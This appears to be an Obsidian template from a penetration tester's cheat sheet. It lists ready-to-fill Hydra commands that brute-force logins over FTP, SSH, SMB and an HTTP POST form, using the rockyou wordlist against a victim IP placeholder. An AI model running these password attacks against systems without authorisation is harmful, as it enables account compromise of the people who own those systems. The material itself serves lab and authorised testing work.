---
tags:
  - Cracking
  - Hydra
---

> [!example] Hydra - ftp
> 
> ```
> hydra <% tp.frontmatter["VictimIP"] %> -l usuario -P /usr/share/wordlists/rockyou.txt  ftp://<% tp.frontmatter["VictimIP"] %>
> ```

> [!example] Hydra - ssh
> 
> ```
> hydra <% tp.frontmatter["VictimIP"] %> -l usuario -P /usr/share/wordlists/rockyou.txt  ssh://<% tp.frontmatter["VictimIP"] %>
> ```

> [!example] Hydra - smb
> 
> ```
> hydra <% tp.frontmatter["VictimIP"] %> -l usuario -P /usr/share/wordlists/rockyou.txt  smb://<% tp.frontmatter["VictimIP"] %>
> ```

> [!example] Hydra - post-form
> 
> ```
> hydra -l usuario -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["VictimIP"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
> ```
